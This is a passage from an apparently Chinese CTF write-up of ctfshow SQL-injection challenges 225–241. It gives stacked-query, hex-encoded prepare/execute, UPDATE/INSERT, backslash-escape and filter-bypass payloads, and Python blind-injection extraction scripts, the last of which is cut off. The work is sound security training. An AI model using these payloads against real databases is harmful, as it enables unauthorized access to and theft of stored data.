</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-225-堆叠提升"><a href="#web-225-堆叠提升" class="header-anchor">#</a> web 225 堆叠提升</h2> <p>堆叠注入，查询表名</p> <p><img src="/medias/show-sql/225.png" alt="225"></p> <p>在f12调试界面可以看到接口返回的信息，两个表名，应该是键名<code>tables_in_ctfshow_web</code>和字段对不上，所以没有直接显示在页面里。</p> <p>查询flag表里的字段名</p> <p><img src="/medias/show-sql/2250.png" alt="2250"></p> <p>这道题类似<code>强网杯 2019 - 随便注</code>。下面有多种解题思路</p> <p><a href="/pages/a7f3bd/">强网杯 2019 - 随便注</a></p> <h3 id="思路一"><a href="#思路一" class="header-anchor">#</a> 思路一</h3> <p>直接读取表里的内容，这里flag在表里的第一行，直接读出来了，如果不是第一行，可以多执行几次<code>handler a read next;</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>ctfshow_flagasa<span class="token punctuation">`</span></span> <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/show-sql/2252.png" alt="2252"></p> <h3 id="思路二"><a href="#思路二" class="header-anchor">#</a> 思路二</h3> <p>执行预处理的sql语句，通过拼接绕过select的限制，变量名不要叫<code>sql</code>，<code>sql是关键字</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>ctfshow<span class="token string">';show tables;prepare a from concat('</span>s<span class="token string">','</span>elect<span class="token string">','</span> <span class="token operator">*</span><span class="token keyword">from</span> ctfshow_flagasa'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/show-sql/2253.png" alt="2253"></p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>通过拼接执行<code>select version();</code>，发现这是<code>{version(): &quot;10.3.18-MariaDB&quot;}</code>，是mysql的一个分支，大多数语法都是兼容的，但是在这里的执行动态拼接语句是一个不兼容问题。<br> <code>MariaDB</code>可以执行<code>concat</code>函数拼接的sql语句，<code>Mysql</code>更严格，不允许</p></div> <h2 id="web-226-16进制-预处理"><a href="#web-226-16进制-预处理" class="header-anchor">#</a> web 226 16进制+预处理</h2> <p><code>prepare from</code>还可以直接处理十六进制字符串，太强了。测试发现，<code>mysql</code>是不兼容这个语法，局限于题目的这个MariaDB数据库了。</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># show tables</span>
<span class="token keyword">prepare</span> a <span class="token keyword">from</span> <span class="token number">0x73686F77207461626C65733B</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># select *from ctfsh_ow_flagas</span>
<span class="token keyword">prepare</span> a <span class="token keyword">from</span> <span class="token number">0x73656C656374202A66726F6D2063746673685F6F775F666C61676173</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="web-227-数据存储过程"><a href="#web-227-数据存储过程" class="header-anchor">#</a> web 227  数据存储过程</h2> <p>新增过滤<code>db``,</code>，上一题的思路还能用</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># show tables  只有一个ctfshow_user表</span>
<span class="token keyword">prepare</span> a <span class="token keyword">from</span> <span class="token number">0x73686F77207461626C65733B</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># select *from ctfshow_user 查到的信息都是题目已经给的</span>
<span class="token keyword">prepare</span> a <span class="token keyword">from</span> <span class="token number">0x73656C656374202A66726F6D2063746673686F775F75736572</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>换个思路，可能flag存进去又删库了。找找记录？</p> <p><img src="/medias/show-sql/227.png" alt="227"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 查找在存储过程是否定义了flag</span>
<span class="token keyword">SELECT</span> ROUTINE_DEFINITION <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>ROUTINES
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>转成16进制，执行预处理sql语句，可以看到定义过程的flag。太强了，又有了奇怪的想法</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>user1'<span class="token punctuation">;</span><span class="token keyword">prepare</span> a <span class="token keyword">from</span> <span class="token number">0x53454C45435420524F5554494E455F444546494E4954494F4E2046524F4D20696E666F726D6174696F6E5F736368656D612E524F5554494E4553</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/show-sql/2271.png" alt="2271"></p> <h2 id="web-228-web-230-思路相同"><a href="#web-228-web-230-思路相同" class="header-anchor">#</a> web 228 -- web 230 思路相同</h2> <p>这题把黑名单字符串放进了数据库的一个表里了，不给看，好思路。如果可以把这个表删了是不是就无敌了，不过现在使用16进制执行命令也没什么限制，哈哈</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>ctf'<span class="token punctuation">;</span><span class="token keyword">prepare</span> a <span class="token keyword">from</span> <span class="token number">0x53454C454354202A2046524F4D20696E666F726D6174696F6E5F736368656D612E524F5554494E4553</span><span class="token punctuation">;</span><span class="token keyword">execute</span> a<span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-231-update注入"><a href="#web-231-update注入" class="header-anchor">#</a> web 231 update注入</h2> <p>在网络界面js里找到传参的方式</p> <p><img src="/medias/show-sql/230.png" alt="230"></p> <p>先测试修改ctfshow用户的密码</p> <p><img src="/medias/show-sql/2301.png" alt="2301"></p> <p>接口返回信息，修改成功，可以正常执行</p> <p><img src="/medias/show-sql/2302.png" alt="2302"></p> <p>在password字段上注入，把想查的数据通过子查询和update修改到当前显示的表里。因为把后面where判断注释了，所以会修改整个表</p> <p><code>在发愁记不住查库表字段语句？hackerbar准备的有联合查询语句，删掉union就可以用了</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 查库</span>
username<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token string">',username=(select group_concat(schema_name) from information_schema.schemata);#
# 查表
username=information_schema,test,mysql,performance_schema,ctfshow_web&amp;password=1'</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查字段flag在flaga表的flagas字段里</span>
username<span class="token operator">=</span>banlist<span class="token punctuation">,</span>ctfshow_user<span class="token punctuation">,</span>flaga
<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token string">',username=(select group_concat(column_name) from information_schema.columns where table_schema=database());#
# 查flag
username=id,char,id,username,pass,id,flagas,info&amp;password=1'</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagas<span class="token punctuation">)</span> <span class="token keyword">from</span> flaga<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="web-232"><a href="#web-232" class="header-anchor">#</a> web 232</h2> <p>修改语句给password添加了一个md5函数处理，直接给他闭合，后面加上自己的上题的语句。测试查询版本信息，可以正常执行</p> <p><img src="/medias/show-sql/232.png" alt="232"></p> <p><img src="/medias/show-sql/2321.png" alt="2321"></p> <p>下面就和上题一样做就可以</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 测试</span>
username<span class="token operator">=</span><span class="token number">10.3</span><span class="token number">.18</span><span class="token operator">-</span>MariaDB<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token string">'),username=(select version());#
# 查库
username=10.3.18-MariaDB&amp;password=1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查表</span>
username<span class="token operator">=</span>information_schema<span class="token punctuation">,</span>test<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>ctfshow_web<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token string">'),username=(select group_concat(table_name) from information_schema.tables where table_schema=database());#
# 查字段 flag在flagaa表的flagass字段
username=banlist,ctfshow_user,flaga
&amp;password=1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查flag</span>
username<span class="token operator">=</span>id<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>pass<span class="token punctuation">,</span>id<span class="token punctuation">,</span>flagass<span class="token punctuation">,</span>info<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagass<span class="token punctuation">)</span> <span class="token keyword">from</span> flagaa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="web-233-布尔盲注"><a href="#web-233-布尔盲注" class="header-anchor">#</a> web 233 布尔盲注</h2> <p>这题目怎么又回到之前的版本了。直接狠狠地sql注入(注不进去，题目存在过滤)</p> <p>前面的payload注入没有变化，可能是对<code>password</code>做了过滤，试试<code>username</code>处能不能时间盲注，页面可以执行<code>username=ctfshow' and if(1=1,sleep(3),0)#&amp;password=1</code>。看大佬脚本根据update是否修改成功的回显，使用了布尔盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>
<span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">'http://398f1aa4-200c-4594-af45-5d7b0a59f091.challenge.ctf.show/api/'</span>
flag<span class="token operator">=</span><span class="token string">''</span>
i<span class="token operator">=</span><span class="token number">0</span>
j <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head<span class="token operator">=</span><span class="token number">1</span>
    tail<span class="token operator">=</span><span class="token number">127</span>
    i<span class="token operator">+=</span><span class="token number">1</span>
    <span class="token keyword">while</span> head<span class="token operator">&lt;</span>tail<span class="token punctuation">:</span>
        j<span class="token operator">+=</span><span class="token number">1</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">1</span>
        <span class="token comment"># 爆表 flag233333</span>
        <span class="token comment"># payload=f&quot;ctfshow' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{mid},1,0)#&quot;</span>
        <span class="token comment"># 爆字段 id,flagass233,info</span>
        <span class="token comment"># payload=f&quot;ctfshow' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag233333'),{i},1))&gt;{mid},1,0)#&quot;</span>
        <span class="token comment"># 爆flag</span>
        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;ctfshow' and if(ascii(substr((select group_concat(id,flagass233,info) from flag233333),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,1,0)#&quot;</span></span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span>j
        <span class="token punctuation">}</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;\\u66f4\\u65b0\\u6210\\u529f&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token comment">#更新成功</span>
            head<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail<span class="token operator">=</span>mid
    <span class="token keyword">if</span> head<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><h2 id="web-234-反斜杠转义"><a href="#web-234-反斜杠转义" class="header-anchor">#</a> web 234 反斜杠转义</h2> <p>相比于上题，这题<code>'</code>单引号被过滤了，看了师傅<a href="https://boogipop.com/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/#Web234%EF%BC%88%E8%BD%AC%E4%B9%89" target="_blank" rel="noopener noreferrer">反斜杠转义<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。现在不能主动用单引号闭合了，如果使用反斜杠转义原有的单引号，有更好玩的姿势</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment"># 原始语句</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$password</span><span class="token punctuation">}</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>';&quot;</span><span class="token punctuation">;</span>
<span class="token comment"># 反斜杠转义后</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;update ctfshow_user set pass = '\' where username = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>';&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>反斜杠转义后，出现<code>pass='\' where username ='{$username}';</code>，变量pass=<code>where username =</code>，原有的where语句被pass变量吞掉了，变量username出来了</p> <p>这个sql语句可以看成</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span> <span class="token operator">=</span> update ctfshow_user set pass <span class="token operator">=</span> <span class="token string single-quoted-string">'where username = '</span><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span>'<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>现在可以看到{$username}前面的单引号跟pass的单引号闭合了，后面还多出一个单引号，需要注释掉，不然语句就是错的。
子查询放括号里</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=\</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>用这个思路，接着爆库表数据</p> <h2 id="web-235"><a href="#web-235" class="header-anchor">#</a> web 235</h2> <p>题目过滤了<code>or</code>,<code>'</code>，子查询里的information用不了了，在mysql中其他类似作用库如<code>innodb_table_stats</code>，作用和<code>information_schema.tables</code>类似。可以查出库名，表名</p> <p><img src="/medias/show-sql/info.png" alt="info"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=2\</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>通过子查询套出表中字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flag23a1<span class="token punctuation">)</span>d
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这句子查询sql中，最后多出一个字母d，因为sql要求子查询派生表也要有表名，最后那个就是表名，可以随便起</p> <h2 id="web-236"><a href="#web-236" class="header-anchor">#</a> web 236</h2> <p>题目提示过滤了<code>flag</code>，但是用上一题做法还是能做出了(没有过滤？)</p> <h2 id="web-237-insert"><a href="#web-237-insert" class="header-anchor">#</a> web 237  insert</h2> <p>在网络接口看到<code>insert.php</code></p> <p><img src="/medias/show-sql/237.png" alt="237"></p> <p>在insert.php页面源码里可以看到接口</p> <p><img src="/medias/show-sql/2371.png" alt="2371"></p> <p>首页的sql语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;insert into ctfshow_user(username,pass) value('{$username}','{$password}');&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>☝🤓唉，有钱了买两杯豆浆，喝一杯倒一杯。两个参数，想怎么玩怎么玩，类似刚才的<code>update</code>。同样注意单引号的闭合，<code>value()</code>的闭合，否则语法错误。也可以用<code>反斜杠转义</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 爆表 flag</span>
username<span class="token operator">=</span><span class="token number">1</span><span class="token string">',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1
# 爆字段 flagass23s3
username=1'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=1</span>
<span class="token comment"># 爆flag</span>
username<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagass23s3<span class="token punctuation">)</span> <span class="token keyword">from</span> flag <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="web-238"><a href="#web-238" class="header-anchor">#</a> web 238</h2> <p>过滤了空格，通过测试，<code>%09</code>,<code>%0a</code>,<code>%0b</code>,<code>%0c</code>,<code>%0d</code>这些都不能用，可能只有get传参能用？绕过效果都不太好<code>/**/</code>注释也不能用。反引号括号还挺好用</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 爆表 banlist,ctfshow_user,flagb</span>
username<span class="token operator">=</span><span class="token number">111</span><span class="token string">',(select(group_concat(table_name))from(information_schema.tables)where`table_schema`=database()))#&amp;password=2
# 爆字段 id,char,id,username,pass,id,flag,info
username=111'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token identifier"><span class="token punctuation">`</span>table_schema<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=2</span>
<span class="token comment"># 爆flag</span>
username<span class="token operator">=</span><span class="token number">111</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token identifier"><span class="token punctuation">`</span>flagb<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=2</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/medias/show-sql/238.png" alt="238"></p> <h2 id="web-239"><a href="#web-239" class="header-anchor">#</a> web 239</h2> <p>过滤了<code>or</code>，熟悉。<code>information</code>库不能用了，使用<code>innodb_table_stats</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 爆表 banlist,ctfshow_user,flagbb</span>
username<span class="token operator">=</span><span class="token number">1</span><span class="token string">',(select(group_concat(table_name))from(mysql.innodb_table_stats)where`database_name`=database()))#&amp;password=1
# 爆字段（子查询套娃套不出来了）撞狗运(字段flag)
username=1'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flagbb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;password=1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="web-240"><a href="#web-240" class="header-anchor">#</a> web 240</h2> <p><code>or</code>,<code>mysql</code>都过滤了，拿不到表名了。不过，题目交代了表名相关信息<code>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</code></p> <p>用bp抓包爆破一下。准备payload：<code>username=1',(select(group_concat(flag))from(flagbb)))#&amp;password=1</code>，表名就是爆破点</p> <p><img src="/medias/show-sql/240.png" alt="240"></p> <p><img src="/medias/show-sql/2401.png" alt="2401"></p> <p>回到题目界面刷新倒序，看到flag已经插入进去了</p> <p><img src="/medias/show-sql/2402.png" alt="2402"></p> <h2 id="web-241-delete"><a href="#web-241-delete" class="header-anchor">#</a> web 241 delete</h2> <p>在调试工具里可以看到删除逻辑的处理请求</p> <p><img src="/medias/show-sql/241.png" alt="241"></p> <p>在接口处尝试sleep函数，可以正常执行。用时间盲注爆出flag</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url<span class="token operator">=</span><span class="token string">'http://000bf014-0e7f-448b-ac7b-97668a2fa081.challenge.ctf.show/api/delete.php'</span>
i<span class="token operator">=</span><span class="token number">0</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head<span class="token operator">=</span><span class="token number">1</span>
    tail<span class="token operator">=</span><span class="token number">127</span>
    i<span class="token operator">+=</span><span class="token number">1</span>
    <span class="token keyword">while</span> head<span class="token operator">&lt;</span>tail<span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>head<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">1</span>
        payload<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token comment"># 爆表 banlist,ctfshow_user,flag</span>
        <span class="token comment"># &quot;id&quot;:f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&gt;{mid},sleep(0.05),1)&quot;</span>
        <span class="token comment"># 爆字段 id,flag,info</span>
        <span class="token comment"># &quot;id&quot;:f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{i},1))&gt;{mid},sleep(0.05),1)&quot;</span>
        <span class="token comment"># 爆金币</span>
        <span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;if(ascii(substr((select group_concat(id,flag,info) from flag),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(0.05),1)&quot;</span></span>
        <span class="token punctuation">}</span>
        t1<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
